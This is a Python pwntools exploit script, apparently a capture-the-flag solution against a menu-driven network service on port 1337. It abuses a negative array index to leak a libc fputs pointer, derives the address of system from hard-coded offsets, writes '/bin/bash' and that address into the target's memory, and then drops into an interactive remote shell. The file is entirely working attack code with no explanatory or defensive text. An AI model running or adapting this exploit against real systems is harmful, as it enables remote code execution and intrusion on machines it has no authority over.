#!/usr/bin/env python
import pwn
import sys
import struct

def catch(i, name):
	while True:
		c.recvuntil('Choice:\n')
		c.send(b"2\n1\n")
		c.recvuntil('Choice:\n')
		c.recvline()
		catch = c.recvline()
		print catch
		if 'broke' in catch:
			continue
		break
	c.send(("%d\n" % i).encode('utf8') + name + b"\n")

c = pwn.remote(sys.argv[1], 1337)
c.recvuntil('Choice')
c.send(b"1\n-46\n")
c.recvuntil('with ')
ptr = struct.unpack("<Q", c.recv(6) + b"\x00\x00")[0]
print "fputs at " + hex(ptr)
system = ptr + (0x4f440 - 0x7f1f0)
print "system at " + hex(system)
catch(1, b"/bin/bash")
catch(-46, struct.pack("<Q", system))
c.interactive()
